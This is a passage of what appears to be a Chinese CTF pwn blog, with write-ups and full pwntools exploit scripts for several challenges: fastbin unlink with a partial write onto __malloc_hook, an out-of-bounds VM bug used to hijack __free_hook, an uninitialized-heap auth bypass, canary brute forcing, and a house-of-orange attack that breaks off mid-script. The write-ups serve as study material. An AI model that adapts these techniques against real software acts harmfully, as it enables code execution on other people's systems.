attack为了实现修改__malloc_hook处的数据，我们可以利用fastbin将堆块分配到此处，这样我们就能改写此处的数据了。\n[Fastbin只检查它单向链表中每个块的size域是否符合条件]{.mark}。我们可以在__malloc_hook附近找一个可以伪造的块，想办法把这个块加入到fastbin的链表中，这样，当我们malloc分配时，就可以分配到这个块，这样我们就能修改__malloc_hook的数据了。\n我们发现，__malloc_hook上方不远处有一个符合条件的区域\n\n\n假如,我们的块从图中的0x 7F535F744AED处开始，那么0x 7F535F744AED + 8 &#x3D; 7F535F744AF5正好是块的size域,由于size域是8字节空间，图中，它后面都是0，因此它的值就是7F，由于fastbin在malloc时，只检查size域，因此，我们可以把0x 7F535F744AED(注意这个地址是随机的，但是**[它位于__malloc_hook – 0x23处]{.mark}**，因此，我们可以来爆破，看下文partial write技术)链接到fastbin里，这样，我们重新分配时，就可以分配到这里。\npartial write前面的演示，我们知道了unsorted bin里最后一个块的fd会残留libc中main_arena+88的地址。(这里开启了另一个程序实例，所有里面的地址变了，不要在意)\n\n\n由于内存的页载入机制，PIE的随机化只能影响到单个内存页。一般一个内存页大小为0x1000，这就意味着不管地址怎么变，某条指令的后3个十六进制数字的是始终不变的，与它在二进制文件中的地址后3个十六进制是一样的，从图中，我们可以看出,main_arena在libc2.23中的地址后三个数是B78。\n我们验证一下，以malloc_hook的地址为例，我们看到，它的静态地址是这样的\n\n\n后三个数数B10\n我们再看看它加载的地址\n\n\n也是B10\n也就是说，在同一个页里，就后2字节不一样，由于main_arena+ 88和__malloc_hook-0x23在同一个页里，现在我们已知后三个十六进制数字，那么我们只需爆破倒数第四个数字，即可得到__malloc_hook-0x23的地址。其实也不用爆破，我们就让倒数第4个数字固定，我们就假如它是2吧(随意)，只要我们多次运行程序，总有一次地址正好吻合。\nattack_addr_suffix = 4096 * 2 + ((malloc_hook &amp; 0xFFF) - 0x23)  \n那么，我们需要把上面这个2字节覆盖到那个unsorted bin块的fd的低二字节，由于采用的是小端存储，正好可以覆盖，并且保留前面的字节数据。\n\n\n如图，通过前一个块的溢出，我们修改了数据，我们跳过去看看\n\n\n遗憾的是，这个地址不是我们的目标处，由于我们假定倒数的第四个数字是2，当前这一次，不走运，地址没有和假定吻合。但是，当我们不断重新运行程序，总有一次会吻合。那个时候我们就可以把__malloc_hook指向我们的shellcode，然后进行一次malloc操作即可getshell。\n好了，那我们正式解题吧\n先看看保护机制（这一步应该放在最前面的，因为我们需要依据这个想办法）\n\n\nRELRO 完全开启，意味着我们不能修改GOT表。NX和PIE未开启，意味着我们可以在堆栈里存入shellcode，然后跳到那里去执行shellcode。\n先看看程序逻辑（delete功能没有把指针清空）\n\n\n编辑功能存在UAF以及溢出漏洞,size未做检查，可以溢出堆，UAF也可以编辑堆，真是漏洞百出\n\n\n我们决定把shellcode存到bss段0x601020处，因为没有开启PIE,它的地址固定\n\n\n我们如何向这里写入数据呢?\n我们需要先利用unsorted bin发生unlink，控制保存堆指针的数组。\n#chunk0  create(sh,0x100,&#x27;a&#x27;*0x100)  #chunk1  create(sh,0x100,&#x27;b&#x27;*0x100)  #我们首先需要来完成任意写的目的，这个地址处是一个数组，用来保存堆指针的。我们需要先控制这里  target_addr = 0x601040  #构造payload使得chunk0溢出到chunk1,修改chunk1的prev_size和size  #假chunk  #prev_size size  payload = p64(0) + p64(0x101)  #fd、bk  payload += p64(target_addr-0x18) + p64(target_addr - 0x10)  payload += &#x27;a&#x27; * (0x100-8*4)  #修改chunk3的prev_size和size  payload += p64(0x100) + p64(0x110)    edit(sh,0,len(payload),payload)  #发生unlink,chunk0的指针指向了保存堆指针的数组，那么我们就可以修改数组里的指针，让它们指向一些关键地方  delete(sh,1)  \n\n不明白unlink的可以看我之前的博客里有详解https://blog.csdn.net/seaaseesa/article/details/102907138\n发生了unlink，数组里，堆0的指针变成了0x601028，那么我们可以构造payload，从0x601028处溢出到下面，把数组里的几个指针全部修改成其他我们需要的地方，这样当我们编辑对应的堆时，就是编辑这些地址处的数据。比如，现在我们edit(0)就是在编辑0x601028处的数据。\n\n\npayload = p64(0) * 3  payload += p64(bss_addr)  #将堆0指针变成bss_addr，这样我们就可以往bss里写shellcode了  edit(sh,0,len(payload),payload)  \n\n接下来，我们要开始来实现如何修改malloc_hook了。\n#chunk2  create(sh,0x10,&#x27;c&#x27;*0x10)  #chunk3 这个必须是unsorted bin范围  create(sh,0x80,&#x27;d&#x27;*0x80)  #chunk4  create(sh,0x65,&#x27;e&#x27;*0x65)  #chunk5  create(sh,0x65,&#x27;f&#x27;*0x65)  #free chunk3后，chunk3的fd和bk残留了libc里面的main_area + 0x88指针  delete(sh,3)    #覆盖低2字节，使得chunk3的FD指向了malloc hook-0x23  create(sh,0x80,p16(attack_addr_suffix)) #chunk6  \n\nchunk2用于溢出到chunk3，对chunk3进行修改。\n我们要想实现将malloc_hook-0x23处链接到unsorted bin的链表中去，现在，假设我们覆盖chunk3的fd低2字节后，地址吻合了，那么malloc_hook-0x23已经连接到了chunk3的fd，那么我们就需要把chunk3加入到单向链表中去即可，那么我们需要通过chunk2溢出到chunk3修改chunk3的size域，使它在fastbin范围内，这里，我们就改成0x71吧\npayload = &#x27;c&#x27;*0x10  payload += p64(0) + p64(0x71)  edit(sh,2,len(payload),payload)  \n\n现在还有问题是，我们又不知道chunk3的地址，那么我们还需要再利用一次partial write。\n我们先释放chunk4、chunk5，这样,形成了以chunk5为头结点的fastbin单向链表，由于chunk4和chunk3在内存中是相邻的，并且他们的地址只有最后一字节不一样，由于最后一字节我们是可以得到的，只需用IDA观察即可\nChunk3\n\n\nChunk4\n\n\nChunk5的fd域\n\n\n我们发现，chunk3和chunk4的地址只有最后一个字节的差别，我们可以利用UAF漏洞，把chunk5的fd的低1字节覆盖成0x30，这样，chunk5的fd就指向了chunk3\n#释放chunk4、chunk5，这样chunk5、chunk4构成了fastbin单向链表  delete(sh,4)  delete(sh,5)  #我们覆盖chunk5的fd的低1字节，目的是让chunk5的fd指向chunk3，因为我们不确定chunk3的地址，当我们确定它地址的最后一个字节。  edit(sh,5,1,p8(0x30))  \n\n这样操作以后，形成了这样的一个fastbin链表\n[Chunk5➡ chunk3 ➡ __malloc_hook-0x23]{.mark}\n因此我们malloc三次后，就分配到了__malloc_hook-0x23处，我们就可以修改__malloc_hook了\n由于程序会检测数组里指针的个数，超过10个就不给创建了，因此我们在bss段写入shellcode时，顺便把数组里覆盖为0\n\n\n#在bss段写入shellcode，顺便把堆指针从数组里清空，这样我们又创建多个堆了，不然超过10个就不允许创建了  payload = shellcode.ljust(0x20,&#x27;\\x00&#x27;)  payload += p64(0) * 8  edit(sh,0,len(payload),payload)  \n\n我们最终完整的exp脚本\n#coding:utf8  from pwn import *    context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;)    elf = ELF(&#x27;./timu&#x27;)  libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)    #bss段，我们待会把shellcode写入这里  bss_addr = 0x601020  #我们的目的是把__malloc_hook指向bss_addr，这样，当我们malloc时,我们在bss里放的代码被调用  #从而getshell  malloc_hook = libc.symbols[&#x27;__malloc_hook&#x27;]  #我们的攻击目标,我们利用fastbin，想办法让堆分配到malloc_hook地址-0x23处  #由于不能泄露地址，但是由于PIE的缺陷,符号的地址的后3个十六进制数字和它在  #二进制文件中的地址的后三个十六进制数是一样的。然后，我们就直接设定倒数第  #个十六进制数字为2，这样，我们不断爆破，总有一次，它的后4个十六进制数字为  #这个  attack_addr_suffix = 4096 * 2 + ((malloc_hook &amp; 0xFFF) - 0x23)    #shellcode  shellcode = asm(shellcraft.sh())    def create(sh,size,content):     sh.sendlineafter(&#x27;Your choice :&#x27;,&#x27;1&#x27;)     sh.sendlineafter(&#x27;Size: &#x27;,str(size))     sh.sendafter(&#x27;Data: &#x27;,content)    def edit(sh,index,size,content):     sh.sendlineafter(&#x27;Your choice :&#x27;,&#x27;3&#x27;)     sh.sendlineafter(&#x27;Index: &#x27;,str(index))     sh.sendlineafter(&#x27;Size: &#x27;,str(size))     sh.sendafter(&#x27;Data: &#x27;,content)    def delete(sh,index):     sh.sendlineafter(&#x27;Your choice :&#x27;,&#x27;2&#x27;)     sh.sendlineafter(&#x27;Index: &#x27;,str(index))      def crack(sh):     #chunk0     create(sh,0x100,&#x27;a&#x27;*0x100)     #chunk1     create(sh,0x100,&#x27;b&#x27;*0x100)     #我们首先需要来完成任意写的目的，这个地址处是一个数组，用来保存堆指针的。我们需要先控制这里     target_addr = 0x601040     #构造payload使得chunk0溢出到chunk1,修改chunk1的prev_size和size     #假chunk     #prev_size size     payload = p64(0) + p64(0x101)     #fd、bk     payload += p64(target_addr-0x18) + p64(target_addr - 0x10)     payload += &#x27;a&#x27; * (0x100-8*4)     #修改chunk3的prev_size和size     payload += p64(0x100) + p64(0x110)       edit(sh,0,len(payload),payload)     #发生unlink,chunk0的指针指向了保存堆指针的数组，那么我们就可以修改数组里的指针，让它们指向一些关键地方     delete(sh,1)     payload = p64(0) * 3     payload += p64(bss_addr)     #将堆0指针变成bss_addr，这样我们就可以往bss里写shellcode了     edit(sh,0,len(payload),payload)       #chunk2     create(sh,0x10,&#x27;c&#x27;*0x10)     #chunk3 这个必须是unsorted bin范围     create(sh,0x80,&#x27;d&#x27;*0x80)     #chunk4     create(sh,0x65,&#x27;e&#x27;*0x65)     #chunk5     create(sh,0x65,&#x27;f&#x27;*0x65)     #free chunk3后，chunk3的fd和bk残留了libc里面的main_area + 0x88指针     delete(sh,3)       #覆盖低2字节，使得chunk3的FD指向了malloc hook-0x23     create(sh,0x80,p16(attack_addr_suffix)) #chunk6     #修改chunk3的size，目的是让chunk3和chunk5、chunk4的size一样     payload = &#x27;c&#x27;*0x10     payload += p64(0) + p64(0x71)     edit(sh,2,len(payload),payload)     #释放chunk4、chunk5，这样chunk5、chunk4构成了fastbin单向链表     delete(sh,4)     delete(sh,5)     #我们覆盖chunk5的fd的低1字节，目的是让chunk5的fd指向chunk3，因为我们不确定chunk3的地址，当我们确定它地址的最后一个字节。     edit(sh,5,1,p8(0x30))       #在bss段写入shellcode，顺便把堆指针从数组里清空，这样我们又创建多个堆了，不然超过10个就不允许创建了     payload = shellcode.ljust(0x20,&#x27;\\x00&#x27;)     payload += p64(0) * 8     edit(sh,0,len(payload),payload)       #chunk7     create(sh,0x65,&#x27;g&#x27;*0x65)     #chunk8     create(sh,0x65,&#x27;h&#x27;*0x65)       payload = &#x27;a&#x27;*0x13 + p64(bss_addr)     #这个堆的指针指向了__malloc hook,我们修改它的值为bss_addr，这样，当我们再次malloc时，就会调用bss_addr处的shellcode     create(sh,0x65,payload) #chunk9     #当我们再次malloc时，malloc hook执行的函数被调用,我们getshell     sh.sendlineafter(&#x27;Your choice :&#x27;,&#x27;1&#x27;)     sh.sendlineafter(&#x27;Size: &#x27;,&#x27;1&#x27;)     sh.interactive()    #爆破  while True:  #   sh = remote(&#x27;111.198.29.45&#x27;,59617)     sh = process(&#x27;./timu&#x27;)     try:        print &#x27;正在爆破...&#x27;        crack(sh)        break     except:        sh.close()  \n\n成功getshell\n\n","categories":["CTF"],"tags":["unlink","unsorted bin","partial write bypass PIE","fastbin","malloc_hook"]},{"title":"OGeek2019_Final_OVM","url":"/2020/04/30/OGeek2019_Final_OVM/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下,是一个虚拟机\n\n\n其中，这里这条mov reg的指令比较重要\n\n\n还有这里mov memory的指令也比较重要\n\n\n这里两处，都存在下标越界，通过查看汇编指令可知,memory和reg都是**[有符号的数据数组。]{.mark}**\n\n\n因此，利用reg[out] &#x3D; memory[-X]，可以向上越界，将数据存储在reg[out]里。向上越界，可以读取got表，进而可以获得glibc函数地址。同理，memory[-X] &#x3D; reg[op]，可以实现任意地址写。我们可以利用虚拟机指令，将comment篡改为free_hook的地址，然后，虚拟机指令执行完以后\n\n\n这里会有一个对comment进行编辑的操作\n\n\n编辑结束后会调用free\n\n\n因此，我们将comment修改为free_hook，然后编辑的时候编辑为system或one_gadget的地址。\n#coding:utf8from pwn import *#sh = process(&#x27;./ovm&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,25335)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)exit_sym = libc.sym[&#x27;exit&#x27;]free_hook_sym = libc.symbols[&#x27;__free_hook&#x27;]opcode = []def mov_reg(reg,data):   #===================通过运算，使得reg[0]为指定值=============   #reg[i] = (data &amp; 0xFF000000) &gt;&gt; 24   opcode.append(u32( (p8(0x10) + p8(reg) + p8(0) + p8((data &amp; 0xFF000000) &gt;&gt; 24))[::-1]))   #reg[11] = 24   opcode.append(u32( (p8(0x10) + p8(11) + p8(0) + p8(24))[::-1]))   #reg[12] = reg[i] &lt;&lt; 24   opcode.append(u32( (p8(0xC0) + p8(12) + p8(reg) + p8(11))[::-1]))   #reg[i] = (data &amp; 0xFF000000) &gt;&gt; 16   opcode.append(u32( (p8(0x10) + p8(reg) + p8(0) + p8((data &amp; 0xFF0000) &gt;&gt; 16))[::-1]))   #reg[11] = 16   opcode.append(u32( (p8(0x10) + p8(11) + p8(0) + p8(16))[::-1]))   #reg[13] = reg[i] &lt;&lt; 16   opcode.append(u32( (p8(0xC0) + p8(13) + p8(reg) + p8(11))[::-1]))   #reg[12] = reg[12] | reg[13]   opcode.append(u32( (p8(0xA0) + p8(12) + p8(12) + p8(13))[::-1]))   #reg[i] = (data &amp; 0xFF00) &gt;&gt; 8   opcode.append(u32( (p8(0x10) + p8(reg) + p8(0) + p8((data &amp; 0xFF00) &gt;&gt; 8))[::-1]))   #reg[11] = 8   opcode.append(u32( (p8(0x10) + p8(11) + p8(0) + p8(8))[::-1]))   #reg[13] = reg[i] &lt;&lt; 8   opcode.append(u32( (p8(0xC0) + p8(13) + p8(reg) + p8(11))[::-1]))   #reg[12] = reg[12] | reg[13]   opcode.append(u32( (p8(0xA0) + p8(12) + p8(12) + p8(13))[::-1]))   #reg[i] = data &amp; 0xFF   opcode.append(u32( (p8(0x10) + p8(reg) + p8(0) + p8(data &amp; 0xFF))[::-1]))   #reg[i] |= reg[12]   opcode.append(u32( (p8(0xA0) + p8(reg) + p8(reg) + p8(12))[::-1]))#=======================================================================def mov_mem_reg(reg1,reg2):   #memory[reg1] = reg2   opcode.append(u32( (p8(0x40) + p8(reg2) + p8(0) + p8(reg1))[::-1]))def mov_reg_mem(reg1,reg2):   opcode.append(u32( (p8(0x30) + p8(reg1) + p8(0) + p8(reg2))[::-1]))def add_reg(reg1,reg2):   opcode.append(u32( (p8(0x70) + p8(reg1) + p8(reg1) + p8(reg2))[::-1]))def print_reg():   opcode.append(u32( (p8(0) + p8(0) + p8(0) + p8(0xFF))[::-1]))######将comment指向free_hook###############reg[0] = -0x20mov_reg(0,0xFFFFFFE0)#reg[1] = -8mov_reg(1,0xFFFFFFF8)#reg[2] = free_hook_sym - exit_sym - 0x8mov_reg(2,free_hook_sym - exit_sym - 0x8)#将exit的got内容取4字节存入reg[0]mov_reg_mem(0,0)#加上偏移，即变成了free_hook-0x8的地址低4字节add_reg(0,2)#在memory[-0x8]处写上reg[0]的内容mov_mem_reg(1,0)#reg[0] = -0x1Fmov_reg(0,0xFFFFFFE1)#reg[1] = -7mov_reg(1,0xFFFFFFF9)#将exit的got+4内容取4字节存入reg[0]mov_reg_mem(0,0)#在memory[-0x7]处写上reg[0]的内容mov_mem_reg(1,0)##########泄露exit的got表#reg[1] = -0x20mov_reg(1,0xFFFFFFE0)#将exit的got内容取4字节存入reg[1]mov_reg_mem(1,1)print_reg()sh.sendlineafter(&#x27;PC:&#x27;,&#x27;100&#x27;)sh.sendlineafter(&#x27;SP&#x27;,&#x27;0&#x27;)sh.sendlineafter(&#x27;CODE SIZE:&#x27;,str(len(opcode)))sh.recvuntil(&#x27;CODE&#x27;)for o in opcode:   sh.sendline(str(o))sh.recvuntil(&#x27;R0: &#x27;)high = int(sh.recvuntil(&#x27;\\n&#x27;,drop = True),16)sh.recvuntil(&#x27;R1: &#x27;)low = int(sh.recvuntil(&#x27;\\n&#x27;,drop = True),16)exit_addr = (high &lt;&lt; 32) + lowlibc_base = exit_addr - exit_symsystem_addr = libc_base + libc.sym[&#x27;system&#x27;]print &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;system_addr=&#x27;,hex(system_addr)#修改free_hook，然后后面会触发，getshellsh.sendafter(&#x27;HOW DO YOU FEEL AT OVM?&#x27;,&#x27;/bin/sh\\x00&#x27; + p64(system_addr))sh.interactive()","categories":["CTF"],"tags":["解释器/简易虚拟机","下标越界"]},{"title":"PicoCTF_2018_are_you_root","url":"/2020/04/17/PicoCTF_2018_are_you_root/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，只要符合条件就可以显示flag，但是按照正常的逻辑是不能的。\n\n\nLogin时，会malloc一个堆，大小为0x10，并且偏移8处就是auth的验证码。但是login时，并没有初始化*(v7+8)处的值，使得它的值是前面的操作影响。而strdup函数，内部会malloc一个与字符串长度一样的堆，并把字符串拷贝进去。\n\n\nReset的时候，释放的是strdup生成的堆。因此，如果strdup生成的堆为0x20，下一次login时第一个malloc就会取出这个堆，而偏移8处的值就是之前用户输入的name的偏移8处的值，因此auth验证码可以任意控制。\n\n\n#coding:utf8from pwn import *#sh = process(&#x27;./PicoCTF_2018_are_you_root&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,27478)def login(name):   sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;login &#x27; + name)def reset():   sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;reset&#x27;)def getFlag():   sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;get-flag&#x27;)#存在一个未初始化漏洞，没有对level进行校验login(&#x27;a&#x27;*0x8 + p64(0x5))reset()login(&#x27;haivk&#x27;)getFlag()sh.interactive()","categories":["CTF"],"tags":["未初始化漏洞","strdup"]},{"title":"PicoCTF_2018_buffer_overflow_3(本地固定canary的爆破)","url":"/2020/04/30/PicoCTF_2018_buffer_overflow_3/","content":"用IDA分析一下程序，程序从一个固定文件里读取数据，作为canary的值。\n\n\n由于文件内容不变，所以，我们可以直接爆破。\n\n#coding:utf8from pwn import *shell = ssh(host=&#x27;node3.buuoj.cn&#x27;, user=&#x27;CTFMan&#x27;, port=27525, password=&#x27;guest&#x27;)context.log_level = &#x27;critical&#x27;#爆破本地canarycanary = &#x27;&#x27;for i in range(4):   for c in range(0xFF):      #sh = process(&#x27;./PicoCTF_2018_buffer_overflow_3&#x27;)      sh = shell.process(&#x27;./vuln&#x27;)      sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;-1&#x27;)      payload = &#x27;a&#x27;*0x20 + canary + p8(c)      sh.sendafter(&#x27;Input&gt;&#x27;,payload)      sh.recv(1)      ans = sh.recv()      #print ans      if &#x27;Canary Value Corrupt!&#x27; not in ans:         print &#x27;success guess the index(&#123;&#125;),value(&#123;&#125;)&#x27;.format(i,c)         canary += p8(c)         break      else:         print &#x27;try to guess  the index(&#123;&#125;) value&#x27;.format(i)      sh.close()print &#x27;canary=&#x27;,canarypayload = &#x27;a&#x27;*0x20 + canary + p32(0)*4 + p32(0x080486EB)#sh = process(&#x27;./PicoCTF_2018_buffer_overflow_3&#x27;)sh = shell.process(&#x27;./vuln&#x27;)sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;-1&#x27;)sh.sendafter(&#x27;Input&gt;&#x27;,payload)sh.interactive()","categories":["CTF"],"tags":["栈溢出"]},{"title":"Poisonous_Milk(认清vector的结构+house of orange利用)","url":"/2020/02/19/Poisonous_Milk/","content":"首先，我们检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，发现是c++写的程序，看起来复杂了很多，这些一大堆，作用只是打印菜单，那么我们把这个函数重命名为menu。\n\n\n\n\n接下来，我们进入下一个函数查看，应该就是主功能区了。\n为了便于分析，我们给函数重命名了\n\n\n创建内容的函数里，最多输入86个字符\n\n\n实际上只能输入85个字符，并且最后一个会被设置为0\n\n\n接下来，是创建结构体\n\n\n经过分析，这个结构体这样的\ntypedef struct milk &#123;     char *color;     char *content;  &#125;  \n\n但是，这里初始color时，存在一个漏洞\n\n\n[如果我们输入的color不存在，那么结构体里的color指针就不会初始化]{.mark}，它的值就是其他的值。如果把这个结构体释放后再重新申请回来，如果color不存在，那么color指针就会保存着堆地址。因为这个位置正好对应fastbin的fd。这样，我们就可以泄露堆地址。\n\n\n现在，[我们要弄清楚这个qword_203160到底是什么？]{.mark}\n我们发现这个函数极其复杂\n\n\n\n\n先放着，继续分析。\n\n\n推测这玩意儿，应该是一个vector。我们来看看c++的vector的结构\ntemplate&lt;class _Ty,      class _Ax&gt;      class vector          : public _Vector_val&lt;_Ty, _Ax&gt;      &#123;   // varying size array of values  public:      /********/  protected:      pointer _Myfirst;   // pointer to beginning of array      pointer _Mylast;    // pointer to current end of sequence      pointer _Myend; // pointer to end of array      &#125;;  \n\n那么，我们现在可以确定，这个qword_203160就是一个vector了\ntypedef struct vector &#123;     void *start;     void *end;     void *capacity;  &#125;  \n\n为了方便，我们在IDA里重命名一下，现在我们看的清楚了，那个复杂的函数是vector的扩容操作，不用管。每次新增后,插入到end指针的位置，然后end指针向后偏移8字节。\n\n\n分析后，我们知道了，程序中的存储结构\n//存储结构  vector&lt;milk *&gt; milks;  \n\n然后，我们继续分析，显示功能也没什么漏洞\n\n\nDelete节点功能，删除一个节点后,vector的end指针做了相应的调整，那么end没有指向释放后的指针，虽然没有清空指针，也用不了UAF。\n\n\n然后，我们看释放所有节点，以及vector对象本身的函数\n\n\n注意到，释放vector后，没有把vector指针清零，又因为vector指针是放在bss段，是一个全局变量，其他函数可以使用，这意味着，[这个vector本身可以存着UAF漏洞。]{.mark}那么，我们把vector的内存申请回来，就能[控制vector里的begin、end、capacity三个指针]{.mark}，并且，我们把这些指针指向我们可以控制的区域，然后在可以控制的区域，布置下我们需要读写的地址，这样，我们就能实现任意地址读写操作。但是由于本程序没有edit功能，也就没有写，但是，我们可以伪造chunk，实现任意的free操作。从而利用。\n那么，我们就开始攻击吧，首先泄露堆地址\n#创建一个0x20的头结构体加0x20的存储flags的堆，这样，两个堆释放和属于同一个fastbin，并且头结构体作为头，因为后释放  create(&#x27;a&#x27;*(0x10-1))  delete(0)  #接下来重新申请堆，之前的节点结构体内保存着指针，由于flags堆先申请，所以我们不能申请和之前大小一样的  #因为我们要让我们这个节点的结构体申请到前一个释放后的节点的结构体内存位置处  create(&#x27;b&#x27;*0x40)  #泄露堆地址  show()  \n\n由于创建时，大小受限制，我们创建不了unsorted bin访问的chunk，因此，我们需要来伪造unsorted bin chunk，然后利用控制vector的begin、end指针，在可控区域布下一个指针指向我们伪造的节点。\n#释放了所有的堆，以及vector对象本身  drink()  #重新申请到了vector的内存空间，UAF控制vector的begin和end指针  create(p64(heap_base + 0xE50) + p64(heap_base + 0xE58))  #这里是用来创建0x20大小的堆，放入fastbin，给以后申请用，这样申请节点结构体时，就不会从我们辛苦得到的unsorted bin里切割  for i in range(2):     create(&#x27;g&#x27;*0x9) #index 2~3  for i in range(3,1,-1):     delete(i)  \n\n需要注意的一点是，我们提前创建了2个content大小为0x20的节点，然后释放，也就是说，在**[0x20的fastbin里有四个chunk，可以提供给后面的申请使用]{.mark}。并且我们是先drink释放了vector，然后才创建的。而不能先创建再drink，因为drink里面，会将我们放到0x20 fastbin的chunk给用掉(调试的时候发现)。之所以在前面先弄几个0x20的fastbin，[一方面，是为了缩短content与content之间的间隙，方便我们控制]{.mark}，因为如果不这样，节点milk结构体会夹在content与content之间，不方便我们后面的控制。[另一方面，是避免申请堆时，从我们辛苦得到的unsorted bin里切割。]{.mark}**\n上面第二句代码，我们控制了vector的begin和end指针，但是为了不保证出错，我们要确保create时，[这个expand扩容操作，不要超过我们begin指针指向的那个位置所属堆的大小，不然扩容到后面的区域我们不可控]{.mark}。导致show的时候出错，因为后面可能有无效地址。\n\n\n比如我们的begin指针指向了heap_base+0xE50处，而**[heap_base+0xE50是我们待会申请的某个堆的地址，这个堆，我们最大申请0x60字节，最多写入85个字节，也就是我们最多可以在此处放8个节点指针。]{.mark}**扩容超出后，后面的内容我们控制不了，这样show时会导致出错。\n这意味着，接下来的操作，我们在没有delete堆前的create操作，最多8次。这完全够用了。\n#==============为了得到unsorted bin的chunk，我们伪造三个chunk===========  #伪造节点结构体  payload = p64(0) + p64(0x21)  #color_ptr          #flags_ptr  payload += p64(0) + p64(heap_base+0xCD0)  #伪造flags堆  payload += p64(0) + p64(0x101)  payload = payload.ljust(0x40,&#x27;a&#x27;)  create(payload) #index2    payload = &#x27;b&#x27;*0x30  payload += p64(0) + p64(0x31)  payload = payload.ljust(0x50,&#x27;b&#x27;)  create(payload) #index3  #payload = &#x27;c&#x27;*0x10  #在后面继续伪造两个堆，绕过堆检查  payload = p64(0) + p64(0x21)  payload += &#x27;c&#x27;*0x10  payload += p64(0) + p64(0x31)  payload = payload.ljust(0x50,&#x27;c&#x27;)  create(payload) #2  \n\n现在堆伪造好了，我们要释放它，之前我们控制vector的begin指针**[heap_base+0xE50，]{.mark}**\n因此，我们在**[heap_base+0xE50]{.mark}处[放置伪造的节点的地址。]{.mark}**当然，还要把其他申请过的节点的地址放过来，这样，我们后续才能继续控制。\n而通过精心布局，我们接下来申请一个堆，地址就找heap_base+0xE50处，我们就在这里写入几个节点的地址。\n#==================================================================  #这个堆，我们用来伪造vector的每一项的指针item*，通过控制item*指针，我们就对对需要的节点进行操作  #伪造item指针  #0  payload = p64(heap_base+0xCB0) #fake_chunk node  #1  payload += p64(heap_base+0xCB0) #fake_chunk node  #2  payload += p64(heap_base+0xC60) #aaaaaaaaaa node  payload += p64(heap_base+0xD10)   #bbbbbbbbb node  payload += p64(heap_base+0xD70)   #ccccccccc node  payload += p64(heap_base+0xD10)   #  payload += p64(heap_base+0xD70)     #  payload = payload.ljust(0x50,&#x27;c&#x27;)  create(payload) #5  \n\n我们在0和1处放置了一模一样的的fake_chunk地址，这样第一次我们delete(0)后，后面的内容上移动，那么我们继续show(0)，显示的还是fake_chunk处的内容，这样，我们就能实现UAF。\n接下来重点来了\n#fastbin与我们伪造生成的unsorted bin重合！！  delete(3)  delete(2)  delete(1)  \n\n我们来看看bins的布局\n\n\n因为fastbin和unsorted bin里有重合，我们将fastbin的几个chunk申请回来，就能控制unsorted bin里面的内容。这样，我们就能利用house of orange思想来getshell。并且，上面有好几个0x20的bins，用于提供给Milk结构体，而不会从unsorted bin里切割。\n#house of orange  #fake分成2部分，写入  #执行vtable的函数时，FILE结构体地址被作为参数，因此，我们在最开头写/bin/sh字符串  fake_file = &#x27;/bin/sh\\x00&#x27; + p64(0x60) #size作为0x60，被放入small_bin，从而对应了chain指针  #unsorted bin attack，修改_IO_list_all为main_arena+88  fake_file += p64(0) + p64(_IO_list_all_addr-0x10)  #_IO_write_base &lt; _IO_write_ptr  #fake_file += p64(0) + p64(1)  payload = &#x27;a&#x27;*0x20 + fake_file  create(payload.ljust(0x40,&#x27;\\x00&#x27;))  #第二部分  ##vtable指针,同时，也作为fake_vtable的__dummy  fake_file = p64(0) + p64(heap_base + 0xD98)  #__dummy2、__finish  fake_file += p64(0)*2  #__overflow  fake_file += p64(system_addr)  create(fake_file.ljust(0x50,&#x27;\\x00&#x27;))    #getshell  sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;p&#x27;)  sh.sendlineafter(&#x27;Input your flags (0-99):&#x27;,&#x27;f&#x27;*0x40)  \n\n\n\n如果getshell失败，可以多试几次，这是由于栈环境的问题。\n综上，我们的exp脚本\n#coding:utf8  from pwn import *    sh = process(&#x27;./poisonous_milk&#x27;)  #sh = remote(&#x27;111.198.29.45&#x27;,35825)  libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)  malloc_hook_s = libc.symbols[&#x27;__malloc_hook&#x27;]  _IO_list_all_s = libc.symbols[&#x27;_IO_list_all&#x27;]  system_s = libc.sym[&#x27;system&#x27;]    #context.log_level = &#x27;debug&#x27;    def create(payload):     sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;p&#x27;)     sh.sendlineafter(&#x27;Input your flags (0-99):&#x27;,payload)     sh.sendlineafter(&quot;Input your milk&#x27;s color:&quot;,&quot;&quot;)    def delete(index):     sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;r&#x27;)     sh.sendlineafter(&#x27;Give the index :&#x27;,str(index))    def show():     sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;v&#x27;)    def drink():     sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;d&#x27;)    #创建一个0x20的头结构体加0x20的存储flags的堆，这样，两个堆释放和属于同一个fastbin，并且头结构体作为头，因为后释放  create(&#x27;a&#x27;*(0x10-1))  delete(0)  #接下来重新申请堆，之前的节点结构体内保存着指针，由于flags堆先申请，所以我们不能申请和之前大小一样的  #因为我们要让我们这个节点的结构体申请到前一个释放后的节点的结构体内存位置处  create(&#x27;b&#x27;*0x40)  #泄露堆地址  show()  sh.recvuntil(&#x27;[0] [&#x27;)  heap_addr = u64(sh.recvuntil(&#x27;]&#x27;,drop = True).ljust(8,&#x27;\\x00&#x27;))  heap_base = heap_addr - 0xC88  print &#x27;heap_base=&#x27;,hex(heap_base)  #释放了所有的堆，以及vector对象本身  drink()  #重新申请到了vector的内存空间，UAF控制vector的begin和end指针  create(p64(heap_base + 0xE50) + p64(heap_base + 0xE58))  #这里是用来创建0x20大小的堆，放入fastbin，给以后申请用，这样申请节点结构体时，就不会从我们辛苦得到的unsorted bin里切割  for i in range(2):     create(&#x27;g&#x27;*0x9) #index 2~3  for i in range(3,1,-1):     delete(i)    #==============为了得到unsorted bin的chunk，我们伪造三个chunk===========  #伪造节点结构体  payload = 